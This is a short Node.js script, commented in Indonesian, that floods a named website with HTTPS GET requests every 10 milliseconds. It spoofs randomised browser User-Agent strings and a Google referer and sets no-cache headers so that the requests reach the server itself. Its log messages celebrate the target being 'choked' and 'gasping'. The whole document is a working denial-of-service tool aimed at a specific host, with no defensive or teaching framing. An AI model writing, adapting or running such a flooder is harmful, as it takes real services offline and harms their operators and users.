const https = require('https');

// TARGET JANTUNG DATABASE (Halaman Pencarian)
// Ganti target ke panel baru
const target = 'https://freepanel.alfa-lyneen.my.id/';

function strike() {
    const options = {
        method: 'GET',
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + Math.floor(Math.random() * 100) + '.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Cache-Control': 'no-cache',
            'Referer': 'https://www.google.com/'
        }
    };

    const req = https.request(target, options, (res) => {
        console.log(`[ 🌀 ] Strike! | Status: ${res.statusCode} | Target Tercekik!`);
    });

    req.on('error', (e) => {
        console.log(`[ ⚠️ ] Server Megap-megap: ${e.message}`);
    });

    req.end();
}

// KECEPATAN CAHAYA (Interval 10ms)
setInterval(strike, 10);
console.log("THE GHOST IS ACTIVE: Menembus Armor Target...");
